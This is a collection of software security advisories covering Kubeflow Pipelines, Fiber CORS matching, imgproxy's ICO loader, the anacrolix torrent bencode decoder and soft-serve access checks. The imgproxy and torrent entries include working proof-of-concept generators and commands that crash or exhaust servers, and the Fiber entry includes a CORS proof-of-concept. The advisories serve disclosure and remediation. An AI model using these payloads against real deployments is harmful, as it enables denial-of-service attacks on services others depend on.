entry.title: [github.com/kubeflow/pipelines] Kubeflow Pipelines: Pipeline archive upload allows decompression bomb to exhaust server memory
entry.content:
Summary

The Kubeflow Pipelines API server decompresses uploaded pipeline archives without adequately bounding expanded data in affected versions. A small ZIP or gzip-compressed tar archive can consume disproportionately large amounts of memory while the server locates or reads the pipeline file, potentially exhausting API-server resources and interrupting service.

Multipart pipeline and pipeline-version upload processing decompresses the archive before namespace authorization, so a caller who can reach those endpoints does not need a successful pipeline-create authorization decision to trigger the issue. External authentication and network controls can restrict reachability. URL-import handlers authorize before fetching and decompressing a remote archive.

The amount of expansion needed to exhaust memory depends on deployment resource limits and concurrent activity; no particular archive is guaranteed to crash every deployment.

Remediation

Upgrade the API server to Kubeflow Pipelines 2.18.0. Versions through 2.17.3 are affected; the first affected release has not been established.

PR #14171 bounds compressed input and extracted pipeline data. PR #14186 strengthens the total tar traversal budget, including metadata and skipped entries. The 2.18 release also includes configurable upload and specification limits; operators should review the shipped settings and resource budget. These controls address pipeline archive amplification and do not establish general HTTP-body, temporary-disk, concurrency, or CPU limits.

Until upgrading, restrict access to upload and import endpoints and apply deployment-level request and resource controls. A compressed upload-size limit alone does not prevent decompression amplification. Regression tests cover compressed input, selected-entry boundaries, and tar traversal budgets; no deployed-server OOM test was performed for this assessment.

Credit

bugbunny.ai discovered and reported the issue. Ayush Gupta (@Ayush-kathil) authored the archive fixes in #14171 and #14186, with Jeff Spahr (@jeffspahr) contributing regression coverage to #14171.

@BrianWillows later submitted a mixed report that included source analysis of pipeline-archive decompression.

entry.title: [github.com/kubeflow/pipelines] Kubeflow Pipelines: Run-log endpoint permits unauthorized access to pod logs
entry.content:
Summary

The Kubeflow Pipelines API server's GET /apis/v1alpha1/runs/{run_id}/nodes/{node_id}/log handler retrieves logs without authorizing the caller against the selected run. A caller who can reach the backend and knows a victim run ID and a suitable pod or node identifier can read live or archived logs using the API server's permissions.

For live logs, the vulnerable handler also accepts the supplied node ID as a pod name in the run's namespace without verifying that the pod belongs to the run. Depending on the API server's pod-log permissions, a known run ID can therefore permit reading the main container logs of an unrelated pod in that namespace. Logs may contain sensitive workload data or credentials.

The affected handler does not authenticate the request itself. An external authentication gate or network policy can restrict reachability; public ingress exposure and unauthenticated enumeration of run IDs are not assumed.

Remediation

Upgrade the API server to Kubeflow Pipelines 2.18.0. Versions through 2.17.3 are affected; the first affected release has not been established.

PR #13684 authorizes the caller with the readLog verb before retrieving live or archived logs. For live logs, it also verifies that the pod's pipeline/runid label matches the requested run. Custom Kubernetes roles must grant readLog on runs in the pipelines.kubeflow.org API group; the bundled viewer and editor roles include it. Shared read access alone does not grant log access.

Until upgrading, restrict access to the backend log endpoint. Focused regression tests cover authorization denial, HTTP identity propagation, pod/run mismatch, archive retrieval, and cancellation; no new deployed-cluster end-to-end test was performed for this assessment.

Credit

bugbunny.ai discovered and reported the issue. Nayyar (@naruto-lgtm) authored the fix in #13684.

@patchmyday, @thesecguy45, @VitoCrl, @Grg0rry, @arpitjain099, and @BrianWillows made later submissions concerning the run-log authorization gap. MUTEDCYBERSECURITY S.L. separately reported a synthetic two-tenant reproduction, including the unrelated-pod log path.

entry.title: [github.com/gofiber/fiber/v2] Fiber: CORS wildcard origins matched without a dot boundary, allowing credentialed cross-origin reads
entry.content:
Summary

In v2.52.1 and v2.52.2 the CORS middleware matched a wildcard origin such as https://*.example.com by suffix only, without a dot boundary and without comparing the scheme. Any origin whose host ends with the base domain, for example https://evil-example.com or http://notexample.com, was reflected in Access-Control-Allow-Origin, together with Access-Control-Allow-Credentials: true when AllowCredentials is enabled.

v2.52.3 replaced the matcher (#2915) and is not affected. The report was filed against v2.52.15, where the dot boundary holds; see "Other versions" below.

Details

v2.52.1 introduced validateDomain in middleware/cors/utils.go (f0cd3b44, part of the fix for GHSA-fmg4-x8pw-hjhg). It strips scheme and port from both sides and then checks only the suffix, with trimmedPattern = "example.com", so the character before the suffix is never checked:

if strings.HasPrefix(normalizedPattern, "*.") {
    trimmedPattern := normalizedPattern[2:]
    if strings.HasSuffix(normalizedDomain, trimmedPattern) {
        if normalizedDomain != trimmedPattern {
            if strings.TrimSuffix(normalizedDomain, trimmedPattern) != "" {
                return true
            }
        }
    }
}

v2.52.3 (1aac6f61, #2915) replaced it with a scheme-aware prefix/suffix split that keeps the leading dot in the suffix (.example.com).

Proof of concept

app := fiber.New()
app.Use(cors.New(cors.Config{
    AllowOrigins:     "https://*.example.com",
    AllowCredentials: true,
}))
app.Get("/", func(c *fiber.Ctx) error { return c.SendString("secret") })

Request with Origin: https://evil-example.com, as a GET and as a preflight (OPTIONS with Access-Control-Request-Method: GET):

Version https://evil-example.com http://evil-example.com
v2.52.0 not allowed not allowed
v2.52.1, v2.52.2 reflected, Access-Control-Allow-Credentials: true reflected, Access-Control-Allow-Credentials: true
v2.52.3 to v2.52.16 not allowed not allowed

Impact

An app that configures a wildcard-subdomain AllowOrigins with AllowCredentials: true lets any page on a domain that ends with the base domain (for example notexample.com for *.example.com) read authenticated responses cross-origin. Fixed in v2.52.3; upgrade to the latest v2 release.

Other versions

All v2 releases before v2.52.16 also accepted origins with empty labels (https://.example.com, https://a..example.com), and v2.52.3 to v2.52.15 mis-parsed a wildcard entry after a comma and a space ("https://a.com, https://*.example.com"). No registrable domain produces such an origin, so these are hardening rather than part of this advisory. They are fixed in v2.52.16 (#4792).

References

  • https://github.com/gofiber/fiber/security/advisories/GHSA-g5jq-qmqr-qrwf
  • https://nvd.nist.gov/vuln/detail/CVE-2026-119285
  • https://github.com/gofiber/fiber/pull/2915
  • https://github.com/gofiber/fiber/commit/1aac6f618b6bd3e159d2449acb4232a2170b976b
  • https://github.com/gofiber/fiber/releases/tag/v2.52.3
  • https://github.com/advisories/GHSA-g5jq-qmqr-qrwf

entry.title: [github.com/imgproxy/imgproxy] imgproxy has integer overflow in imgproxy ICO loader that causes denial of service and may permit remote code execution
entry.content:
Summary

The ICO loader allocates data_size + BMP_FILE_HEADER_LEN bytes after reading a 32-bit attacker-controlled data_size. For data_size > UINT32_MAX - BMP_FILE_HEADER_LEN, the addition wraps before allocation. imgproxy then writes the ICO prefix and reads up to the original declared size starting 14 bytes into the undersized allocation. A network client can turn this heap overflow into remote denial of service or remote code execution.

Technical details

The vulnerable path is in vips/icoload.c at commit f4fedbb:

uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);
void *actual_data = data + BMP_FILE_HEADER_LEN;

if (vips_foreign_load_read_full(ico->source, actual_data, data_size) <= 0) {
  vips_error("vips_foreign_load_ico_header", "unable to read ICO image data from the source");
  return -1;
}

The crafted directory entry contains:

data_size       = 0xfffffff5 (4294967285)
data_offset     = 22
BMP header size = 14
32-bit result   = (0xfffffff5 + 14) mod 2^32 = 3

The allocation is therefore three bytes. actual_data points 14 bytes after the allocation base. The fixture contains 64 bytes after the ICO header, so the source callback copies those 64 bytes to an invalid destination before it can report that the declared multi-gigabyte payload is incomplete.

The complete source-to-sink path is:

  1. Attacker-controlled bytes begin with the ICO magic 00 00 01 00.
  2. imgproxy identifies the source as ICO and dispatches it to vips_icoload_source_go.
  3. vips_foreign_load_ico_header reads the attacker-controlled data_size.
  4. The 32-bit addition wraps, and VIPS_MALLOC receives the value three.
  5. vips_foreign_load_read_full passes the original data_size to the Go source callback.
  6. The callback writes the available source bytes through the invalid pointer, corrupting the process heap.

Impact

A crafted image can terminate the imgproxy process handling it or potentially lead to remote code execution due to heap corruption.

References

  • https://github.com/imgproxy/imgproxy/security/advisories/GHSA-hff9-5pqw-6w9f
  • https://github.com/imgproxy/imgproxy/commit/a821b6a4cb07a1bf2bb9077431d1c1e734d79917
  • https://github.com/imgproxy/imgproxy/releases/tag/v4.0.16
  • https://github.com/advisories/GHSA-hff9-5pqw-6w9f

entry.title: [github.com/imgproxy/imgproxy/v3] imgproxy has out-of-bounds heap read/write in ICO loader BMP header reconstruction that allows unauthenticated remote worker crash
entry.content:
Summary

Out-of-bounds heap write in imgproxy's ICO loader (vips/icoload.c): when the ICO entry's image data buffer is small, the loader's BMP-header-reconstruction writes land past the allocation, corrupting the size field of the following heap chunk. The worker then aborts deterministically (glibc munmap_chunk(): invalid pointer → SIGABRT → Go panic, exit code 2).

Details

In vips_foreign_load_ico_header in vips/icoload.c, after the ICO entry's image data is read into a heap buffer of data_size + 14 bytes, the loader reconstructs a BMP file header in front of it using fields read from the ICO's internal BITMAPINFOHEADER:

uint32_t num_colors = GUINT32_FROM_LE(*(uint32_t *) (actual_data + 32));  // unvalidated
uint16_t bpp        = GUINT16_FROM_LE(*(uint16_t *) (actual_data + 14));  // unvalidated

if ((num_colors == 0) && (bpp <= 8))
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * (1 << bpp);
else
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * num_colors;

int32_t height = GINT32_FROM_LE(*(int32_t *) (actual_data + 8));  // readable past the buffer
height = height / 2;

With a crafted entry declaring a tiny data_size (e.g. 1 byte), all of these reads (offsets +8, +14, +32) go past the allocation, and the reconstructed-header writes land past the end of the buffer — specifically a 32-bit height/2-derived value at alloc+22..+25, overwriting the LSBs of the size field of the physically following heap chunk. The corrupted size is always original_size >> 1 and, in cgo thread arenas, the NON_MAIN_ARENA bit lands in the IS_MMAPPED position of the corrupted word such that the next free() of the victim deterministically takes glibc's munmap_chunk() abort path, killing the worker. Depending on heap state, the worker returns 500 for the triggering request and aborts on the corrupted chunk's free; in observed production geometry it dies on the same request (exit code 2).

PoC

# make_ico_oob.py — generates the exact 23-byte OOB-write trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-oob.ico  sha256 075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
# 16x16, 0 colors, 0 reserved, 1 plane, 32 bpp, data_size=1, data_offset=0x16.
# The tiny data_size (1) makes the loader's BMPINFOHEADER field reads
# (data+8/+14/+32) and header-reconstruction writes go past the 1+14=15-byte
# allocation.
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 1, 0x16)
data = b'\xAA'  # the single declared image byte
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1'
open('ico-oob.ico', 'wb').write(blob)
print(f"ico-oob.ico: {len(blob)} bytes [VERIFIED]")

# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-oob.ico@png"
# → request fails at transport level (connection reset / empty reply) or
#   HTTP 500; worker dies: munmap_chunk(): invalid pointer → SIGABRT →
#   Go panic dump → exit code 2. One request, one dead worker.

curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/normal.ico@png"
# → HTTP 200, valid thumbnail (control)

Impact

Out-of-bounds write; demonstrated impact is denial of service (worker crash per crafted request). Any imgproxy deployment from the 3.3.x ICO-support series through v4.0.15 (latest at time of report) that processes attacker-supplied images.

entry.title: [github.com/imgproxy/imgproxy/v3] imgproxy has unbounded memory allocation in ICO loader that allows unauthenticated memory-exhaustion DoS via crafted data_size field
entry.content:
Summary

Unbounded and unvalidated memory allocation in imgproxy's ICO loader (vips/icoload.c). An attacker-controlled data_size field (u32) from the ICO directory entry is passed directly to VIPS_MALLOC without any bounds check, so a single crafted 23-byte ICO file makes an imgproxy worker attempt a ~4GB allocation. Present in the latest release (v4.0.15) and the 3.3.x series; confirmed on a live production deployment of imgproxy v4.0.15.

Details

In vips_foreign_load_ico_header in vips/icoload.c, the selected directory entry's data_size is read and used directly for the allocation:

uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

// BMP file explicitly excludes BITMAPFILEHEADER, so we need to add it manually.
VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);

There is no validation that data_size is sane nor any check that the file actually contains data_size bytes at the declared data_offset. A crafted 23-byte ICO whose directory entry declares data_size = 0xfa000068 (~4GB) drives VIPS_MALLOC(NULL, ~4GB + 14).

PoC

# make_ico_4gb.py — generates the exact 23-byte unbounded-allocation trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-4gb.ico  sha256 6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 0xfa000068, 0x16)
data = b'\x00'
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b'
open('ico-4gb.ico', 'wb').write(blob)
print(f"ico-4gb.ico: {len(blob)} bytes [VERIFIED]")

# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-4gb.ico@png"
# → outcome depends on host memory: on a memory-constrained pod the worker
#   OOM-dies; on a larger host the ~4GB allocation succeeds transiently and
#   decode fails -> HTTP 500 (worker survives, but each request burns ~4GB
#   transiently — repeatable memory exhaustion).

Impact

Unauthenticated network DoS / memory-exhaustion: on memory-constrained workers, a crash per crafted request. On larger hosts, ~4GB transient allocation per request (sustained firing exhausts memory or the allocation budget). Any imgproxy deployment that processes attacker-supplied images.

entry.title: [github.com/anacrolix/torrent] anacrolix torrent has unbounded recursion in the bencode decoder that causes stack-overflow crash and CPU-exhaustion DoS
entry.content:
Summary

anacrolix/torrent's bencode decoder (bencode/) applies no limit on the nesting depth of nested dictionaries and lists. Two distinct denial-of-service mechanisms follow from that single root cause, both reachable from a single crafted .torrent file or from metadata obtained from a peer on a magnet-link/v2 download:

  1. Stack-overflow process crash. Decoder.readOneValue recurses once per nesting level with no depth bound. A .torrent whose info value is a list nested a few million levels deep (≈8 MB file) drives the recursion past the 1 GiB goroutine-stack limit and the process dies with an unrecoverable fatal error: stack overflow. 2. Quadratic CPU exhaustion. metainfo.FileTree.UnmarshalBencode (BitTorrent v2) re-parses each subtree at every level, making parse time grow ~O(n²). A v2 info dict with a ~30,000-level file tree (≈0.2 MB) takes ~66 s to decode; 60,000 levels exceeds 90 s of decode time.

Affected: every application embedding github.com/anacrolix/torrent that ingests attacker-supplied metainfo - the CLI tools (cmd/torrent, cmd/torrent2), any server that opens .torrent files, or any client that accepts metadata from a peer for a magnet/v2 download. No depth limit has ever existed in the decoder.

Vulnerability Details

All file:line references are against the pinned commit 4ad31c5170787215c51c6ddaa54abc06b623c11c.

Root cause - no recursion/depth limit in the bencode decoder

bencode/decode.go implements three independently unbounded recursive parsers. There is no depth counter and no MaxDepth/nesting guard anywhere in bencode/ or metainfo/.

Defect 1 - readOneValue recursion (bencode/decode.go:546-549)

case 'd', 'l':
    // read until there is nothing to read
    for d.readOneValue() {
    }                       // <- recurses once per nested dict/list level, unbounded

readOneValue is invoked by Decoder.parseUnmarshaler (bencode/decode.go:591) whenever a decoded field implements bencode.Unmarshaler, which includes bencode.Bytes - the type of MetaInfo.InfoBytes (metainfo/metainfo.go:17). So decoding a normal .torrent routes the entire info value through this recursion. Stack usage is ~256 bytes per level (consistent with the observed ~4M-level crash at the 1 GiB goroutine-stack limit), so nesting l a few million levels deep exhausts the 1 GiB default goroutine-stack limit. Go's stack overflow is a fatal error - it is not a recoverable panic, so the recover() in Decoder.Decode (bencode/decode.go:35-55) cannot intercept it, and the whole process terminates.

Entry points that reach readOneValue with attacker-controlled bytes:

  • metainfo.Load (metainfo/metainfo.go:35) / metainfo.LoadFromFile (metainfo.go:50) - decoding a .torrent file; the info value becomes a bencode.Bytes unmarshaler field.
  • Client.AddTorrent / Client.AddTorrentFromFile -> metainfo.LoadFromFile (client.go:1776 inside AddTorrentFromFile), and TorrentSpec.InfoBytes -> setInfoBytesLocked -> bencode.Unmarshal(b, &info) (torrent.go:638) - peer-fetched metadata.

For the remote-peer path (magnet-link/v2 download), peer-supplied metadata pieces are reassembled and passed to setInfoBytesLocked once complete (torrent.go:1874). The accepted metadata size is capped at maxMetadataSize = 16 MiB (global.go:18), which comfortably admits the ≈8 MB Defect-1 payload and the ≈0.2 MB Defect-2 payload, so both defects are reachable from an untrusted peer, not only from a locally-opened .torrent.

Defect 2 - FileTree.UnmarshalBencode recursive re-parse (metainfo/file-tree.go:42-49)

for key, bytes := range dir {
    var sub FileTree
    err = sub.UnmarshalBencode(bytes)   // <- recurses once per file-tree level, and each call re-runs
                                        //   bencode.Unmarshal over its entire subtree

FileTree implements bencode.Unmarshaler (file-tree.go:53), so the file tree field of a v2 info dict (metainfo/info.go:33) routes through it. Each level calls sub.UnmarshalBencode, which starts with bencode.Unmarshal(bytes, &dir) over the whole remaining subtree. A file tree nested D levels deep therefore performs O(D) bencode.Unmarshal calls, each over an O(D)-sized payload - O(D²) total parse work. The steady state is a CPU-bound single goroutine, so the embedding process simply hangs.

Reachability: any bencode.Unmarshal into metainfo.Info, including the peer-metadata path setInfoBytesLocked (torrent.go:638) for a magnet/v2 download, and MetaInfo.UnmarshalInfo (metainfo/metainfo.go:61-64).

Sanitizers / existing limits that do NOT apply

  • Decoder.MaxStrLen (bencode/decode.go:787-791, default 128 MiB) bounds a single string value; it is never consulted by readOneValue (decode.go:564 does io.CopyN(&d.buf, d.r, length) with no MaxStrLen check) and does not bound dict/list nesting depth.
  • The existing fuzzers (bencode/fuzz_test.go) only round-trip interface{} values; small fuzz inputs cannot synthesize the millions of nesting levels needed to trip the stack limit, which is why this has evaded them.

Impact

  • Denial of service / availability (complete process crash). A single ~8 MB .torrent file, or ~8 MB of metadata from a malicious peer, crashes the embedding application with fatal error: stack overflow (Defect 1). The crash is not recoverable in-process. For a server that ingests user-submitted torrents or runs a long-lived swarm, this is a trivial remote DoS: seed a torrent whose metainfo nests lists deeply, and any client that fetches the metadata dies.
  • Denial of service / availability (CPU starvation). A ~0.2-0.6 MB v2 info dict with a deeply nested file tree pins a core for ~66 s to minutes and blocks any other decode work sharing the process (Defect 2).

Threat actor: an unauthenticated remote peer (v2/magnet metadata, within the allowed 16 MiB metadata size - global.go:18) or a local user opening a malicious .torrent. The remote-peer case is the higher-reachability/cloud scenario; the local-file case requires the victim to open one file (conservative UI:R). Headline CVSS 3.1 base CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H = 6.5 (remote, low-complexity, unauthenticated, requires the victim to open a torrent or receive peer metadata, single-process availability loss); for applications that ingest torrents with no user interaction (programmatic server ingestion), UI becomes N, raising it to 7.5. CWE-674 (Uncontrolled Recursion) is the precise root cause for Defect 1; CWE-407 (Inefficient Algorithmic Complexity) covers Defect 2.

Per-metric justification (headline 6.5 vector, UI:R):

  • Attack Vector (AV): Network - the trigger is peer-supplied metadata (magnet/v2 download, within the 16 MiB metadata budget) or a .torrent file opened by any client of the library; no local access required.
  • Attack Complexity (AC): Low - the payload is a deterministic list-nesting pattern in metainfo; no race, heap grooming, or special environment.
  • Privileges Required (PR): None - feeding metainfo to the decoder is the unprivileged, public API usage.
  • User Interaction (UI): Required - the conservative remote scenario needs the victim to open a magnet/torrent (or accept a peer's metadata); programmatic server ingestion removes this (UI:N -> 7.5).
  • Scope (S): Unchanged - the impacted security authority is the embedding process itself.
  • Confidentiality (C): None - no data disclosure.
  • Integrity (I): None - no data modification.
  • Availability (A): High - Defect 1 terminates the process with fatal error: stack overflow (unrecoverable); Defect 2 starves a core for ~66 s+ per 0.2 MB v2 info dict with clean quadratic scaling.

Reproduction Steps

All runs are local-only within the test host; nothing contacts a network.

Environment and single harness

The harness is a single Go program (go test-style) that builds the malicious payload, then decodes it through the same public API the library uses. It reproduces both defects. Set up a temp module and run the two tests separately (Defect 1 crashes the process, so the two defects cannot share one test run):

go mod init torrent_recursion_dos
go mod edit -require github.com/anacrolix/torrent@v1.61.0
go mod edit -replace github.com/anacrolix/torrent=/path/to/your/checkout
go test -run TestDefect1_StackOverflow -v .
go test -run TestDefect2_CPUExhaustion -v .

Harness (torrent_recursion_dos_test.go, placed in a temp module that imports the local clone):

package torrent_recursion_dos

import (
    "bytes"
    "fmt"
    "os"
    "testing"

    "github.com/anacrolix/torrent/bencode"
    "github.com/anacrolix/torrent/metainfo"
)

// buildInfo loops a list (l ... l e ... e) nested `depth` levels, wrapped in a
// valid .torrent: { "info": <that list> }.
func buildInfo(depth int, mode byte) []byte {
    var b bytes.Buffer
    b.WriteString("d4:infod")
    for i := 0; i < depth; i++ {
        b.WriteByte(mode) // 'l' for a nested list
    }
    for i := 0; i < depth; i++ {
        b.WriteByte('e')
    }
    b.WriteString("ee")
    return b.Bytes()
}

// buildV2Info builds a v2 info dict whose "file tree" nests `depth` single-key
// dicts around a valid 32-byte-pieces-root file leaf.
func buildV2Info(depth int) []byte {
    leaf := map[string]interface{}{
        "": map[string]interface{}{
            "length":      5,
            "pieces root": string(bytes.Repeat([]byte{'A'}, 32)),
        },
    }
    node := leaf
    for i := 0; i < depth; i++ {
        node = map[string]interface{}{"a": node}
    }
    info := map[string]interface{}{
        "meta version": 2, "piece length": 32768, "file tree": node,
    }
    out, _ := bencode.Marshal(info)
    return out
}

// Defect 1: metainfo.Load on a .torrent with a deeply nested info list
// derives a fatal `goroutine stack exceeds 1000000000-byte limit`.
func TestDefect1_StackOverflow(t *testing.T) {
    depth := 4_000_000 // ~8 MB; adjust down if the runtime stack cap differs
    in := buildInfo(depth, 'l')
    if len(os.Getenv("SKIP_CRASH")) == 0 {
        // Decodes into MetaInfo; InfoBytes is a bencode.Bytes unmarshaler, so
        // this drives readOneValue recursion. Crashes the process.
        _, err := metainfo.Load(bytes.NewReader(in))
        _ = err
    }
    fmt.Printf("[defect1] decoded depth=%d without crashing\n", depth)
}

// Defect 2: decoding a v2 info dict with a deep file tree is CPU-quadratic.
func TestDefect2_CPUExhaustion(t *testing.T) {
    depth := 30_000 // ~0.2 MB; ~66 s on this machine
    src := buildV2Info(depth)
    var info metainfo.Info
    if err := bencode.Unmarshal(src, &info); err != nil {
        t.Fatal(err)
    }
    fmt.Println("[defect2] parsed deep v2 file tree")
}

Observations with the pinned commit (Go 1.26, laptop):

# TestDefect1 - process aborts, unrecoverable:
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow
[exit status 2]

# TestDefect2 - wall-clock parse time (single-threaded):
depth=30_000              => ~66 s
depth=60_000              => >90 s (timeout)

To reproduce defect 1 from a saved file instead of the in-memory harness, generate the payload and open it with any of the shipped tools or the metainfo.Load API. The payload is produced inline by the Go harness above; equivalently, emit the same 8,000,010 bytes as d4:infod + 4,000,000 l + 4,000,000 e + ee:

./cmd/torrent -seed -metainfo ./crash.torrent   # crashes

The payload is a single static file; it performs no network I/O, writes nothing, and is a plain non-destructive crash reproducer (a harness, not a weapon).

Recommendations

  1. Add a nesting-depth limit to the decoder (recommended, fixes both defects). Thread a depth counter through parseValue / parseDict / parseList / parseValueInterface / parseListInterface / parseDictInterface / readOneValue, and return a SyntaxError when it exceeds a sane bound (e.g. 64). Forward-compatibly, expose it on Decoder like the existing MaxStrLen (bencode/decode.go:21-32). 2. Make readOneValue length-aware. Apply the same MaxStrLen bound to the io.CopyN(&d.buf, d.r, length) at bencode/decode.go:564 instead of trusting the raw length field, so oversized bulk fields fail as SyntaxError instead of being buffered. 3. Break the O(n²) in FileTree.UnmarshalBencode. Parse the file tree with an explicit, depth-bounded iterative walk (or a single pass over the raw value) instead of re-running bencode.Unmarshal on every subtree level. The depth bound from (1) already arrests the quadratic growth. 4. Convert fatal overflow into a recoverable error. Guarantee that no input can grow the goroutine stack beyond the runtime limit; the depth bound in (1) achieves this. Do not rely on recover() - a stack overflow is fatal and unrecoverable in Go. 5. Fuzz with depth in mind. Add a fuzz seed / corpus that includes deeply nested d/l values and assert both that decoding returns an error (not a crash) and that no level trips the depth limit.

References

  • Source (pinned): https://github.com/anacrolix/torrent @ 4ad31c5170787215c51c6ddaa54abc06b623c11c
    • Unbounded recursion: bencode/decode.go:546-549, bencode/decode.go:591
    • File-tree recursion: metainfo/file-tree.go:42-49
    • Public entry points: metainfo/metainfo.go:35-50, client.go:1776, torrent.go:638
    • Missing MaxStrLen in bulk read: bencode/decode.go:564
    • Metadata size cap (remote reachability): global.go:18, reassembly call torrent.go:1874
  • Prior hardening in this codebase (unrelated to this class, recorded for completeness):
    • v2 pieces-root panic fix: commit 7218a979 ("validate v2 file tree pieces root length before torrent setup"), present at the pinned commit via misc.go:92 -> file-tree.go:164.
    • Path-traversal safeguards in storage (storage/file-paths.go:32 isSubFilepath, storage/safe-path.go:16 ToSafeFilePath) - inspected and found to hold (not the issue here).
  • No published advisory found: OSV.dev and NVD return no records for the package (github.com/anacrolix/torrent, purl pkg:golang/github.com/anacrolix/torrent); the Go ecosystem advisory database lists none.

References

  • https://github.com/anacrolix/torrent/security/advisories/GHSA-2wrx-84qj-4pcg
  • https://github.com/anacrolix/torrent/commit/76452a2c8a2fd9c59d4d4f10fc3495723d538c7b
  • https://github.com/advisories/GHSA-2wrx-84qj-4pcg

entry.title: [github.com/charmbracelet/soft-serve] charmbracelet/soft-serve: Race in `SetPrivate` leaves a private repository readable by unauthenticated users
entry.content:
Summary

Soft Serve cached repository records in memory with no expiry, and trusted the cached record for every access check. SetPrivate cleared the cached record before it saved the new visibility, and not afterwards.

A request that arrived between the two read the old, public record from the database and cached it after the change was saved. From then on every access check used that stale record, so a repository the operator had just made private stayed readable by unauthenticated users over HTTP, SSH, and git:// until the server restarted.

Impact

An unauthenticated attacker can keep reading a repository after it is made private, including everything pushed to it afterwards. The attacker needs no account and no timing knowledge: a client polling GET /<repo>.git/info/refs?service=git-upload-pack, which the default anon-access: read-only allows, will eventually land in the window when the operator changes the visibility.

The stale record lasts until the server restarts or the entry is evicted, and the operator gets no sign of it. repo private <name> reads the database directly and reports true, and the visibility_change webhook is not sent, because its check reads the same stale record.

Write access is not gained. Because the repository was public until the change, an attacker able to win the race could already read its contents up to that point. What this adds is continued access to everything pushed after the operator made it private.

Deployments that run several Soft Serve processes against one shared database were affected more broadly. Each process kept its own cache, so a visibility change made through one process never reached the others, with no race required.

Reachable over HTTP, SSH, and git:// (AV:N). Success depends on a visibility change made by the operator, which the attacker does not control (AC:H). No privileges are required under the default anonymous read access (PR:N), and the attacker interacts with no one, since the operator's change is already captured by AC:H (UI:N). Continued read access to a repository its owner has made private is a high confidentiality impact (C:H), with no integrity or availability impact (I:N, A:N).

Root Cause

The cache was the source of truth for access checks, and clearing it was treated as a step before the write rather than after it.

Backend.Repository in pkg/backend/repo.go returned the cached record when present, and on a miss read the database and stored the result. The cache was a plain LRU of 1000 entries with no expiry (pkg/backend/cache.go), and AccessLevelForUser read the private flag from that record.

SetPrivate ran in this order:

d.cache.Delete(name)
... d.db.TransactionContext(ctx, func(tx *db.Tx) error {
    ... writes or removes git-daemon-export-ok ...
    return d.store.SetRepoIsPrivateByName(ctx, tx, name, private)
})

A reader that missed the cache after the Delete but read the database before the commit got the old row, and stored it after the commit. Nothing ever cleared it again.

SetHidden, SetMirror, SetDescription, and SetProjectName cleared the cache in the same place. DeleteRepository and RenameRepository deferred the clear inside the transaction function, which also runs before the commit.

Moving the clear to after the commit would not have been enough on its own. A reader that read the old row before the commit could still store it after the clear.

Affected Versions

v0.6.0 through v0.12.2. The repository cache and this ordering arrived with the database-backed backend in commit e398b4d (refactor: implement database module and abstract backend, #337), first released in v0.6.0. Versions v0.5.x used a different backend and were not assessed.

Patches

Fixed in v0.12.3.

The repository cache is removed. Every lookup now reads the database, so an access check always sees the visibility most recently saved, whether by this process or any other sharing the database.

Removing the cache was preferred over making it race-free. A database lookup costs tens of microseconds on SQLite, which is small next to the Git work behind each request, while keeping the cache correct needed a versioning scheme around every write and still left multi-process deployments stale. Without the cache, the whole class of stale-authorization bugs goes away rather than this one instance.

The visibility_change webhook is also fixed in the same release. It now compares against the visibility saved before the change, so it fires when visibility actually changes and only then.

Workarounds

It is recommended to upgrade to the patched release.

No configuration closes the race. Restarting the server clears a stale record and restores correct access checks until the next visibility change. Operators who cannot upgrade immediately should create repositories as private from the start (repo create -p) rather than making public ones private, and avoid changing visibility while the server is serving traffic.

References

  • https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-f3fj-9625-rv3m
  • https://github.com/charmbracelet/soft-serve/commit/0a4e6f0b7e063927c7128756e1c1b3db871edabf
  • https://github.com/charmbracelet/soft-serve/commit/5b307b4da4db285f797cc028b381ba4d3d853019
  • https://github.com/charmbracelet/soft-serve/commit/e398b4dde723437f637b06710e0938d349b360e8
  • https://github.com/charmbracelet/soft-serve/releases/tag/v0.12.3
  • https://github.com/advisories/GHSA-f3fj-9625-rv3m

entry.title: [github.com/charmbracelet/soft-serve] charmbracelet/soft-serve HTTP responses disclose the existence and names of private repositories
entry.content:
Summary

Soft Serve answers Go's ?go-get=1 requests by walking up the requested path until it finds a repository, then rendering that repository's name and clone URL into a go-import meta tag. The walk checked that each candidate repository existed, but never that the caller could read it.

A request for a path inside a private repository, such as GET /secret/anything?go-get=1, therefore returned 200 naming secret and its clone URL, even though GET /secret?go-get=1 correctly returned 404. The same ?go-get=1 exception in the HTTP access middleware also let requests reach the LFS and dumb-HTTP routes with the repository existence check skipped, where two LFS handlers dereferenced the missing repository and panicked.

